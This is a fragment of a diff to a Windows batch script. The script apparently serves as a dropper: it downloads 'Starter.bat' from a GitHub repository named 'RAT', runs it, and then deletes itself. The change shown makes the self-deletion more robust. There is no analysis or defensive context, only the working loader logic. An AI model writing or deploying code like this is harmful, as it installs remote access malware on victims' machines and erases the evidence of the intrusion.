@@ -6,4 +6,4 @@ cd %targetd%
 powershell powershell.exe "curl https://raw.githubusercontent.com/saifnasef/RAT/main/Starter.bat -o Starter.bat"
 cmd /c Starter.bat
 cd %currentd%
-del init.bat
+del "%~f0"
